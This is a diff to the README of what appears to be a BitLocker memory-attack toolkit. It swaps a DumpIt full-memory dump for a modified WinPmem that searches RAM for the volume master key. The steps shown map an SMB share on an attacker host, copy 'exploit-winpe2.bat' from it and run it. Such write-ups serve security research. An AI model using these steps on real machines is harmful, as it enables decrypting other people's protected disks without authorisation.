@@ -92,7 +92,6 @@ also need:
 
  - dnsmasq
  - impacket's smbserver.py
- - [Magnet DumpIt for Windows](https://www.magnetforensics.com/resources/magnet-dumpit-for-windows/) (for the WinPE-based approach)
 
 ### Linux Initramfs Generation
 
@@ -270,15 +269,11 @@ which initiates the loading of WinPE from a ramdisk.
 
 ### Boot into WinPE
 
-Connect an external storage device with enough capacity to store a
-complete memory dump of your system. We will assume it is mounted at
-`c:\`.
-
 Reconnect the SMB share, download the attack script and start the second
 part of the exploitation:
 
 ```
-C:
+cd %temp%
 net use S: \\10.13.37.100\smb
 copy S:\exploit-winpe2.bat .
 .\exploit-winpe2.bat S:
@@ -289,11 +284,9 @@ copy S:\exploit-winpe2.bat .
 > storage. This avoids the need for a network connection and might change
 > the internal memory layout.
 
-This will first take a complete memory dump using `DumpIt`. Time will
-depend on the amount of memory and the speed of your external drive.
-
-The memory dump is then searched for a volume master key (VMK). If
-successful, a `vmk-*.dat` file should now exists in the current directory.
+This will search physical memory for a volume master key (VMK) using a
+modified version of [WinPmem](https://github.com/martanne/WinPmem-BitLocker).
+If successful, a `vmk-*.dat` file should now exists in the current directory.
 
 The next step is to determine the byte offset of the encrypted partition
 relative to the start of the disk. This information can be queried as
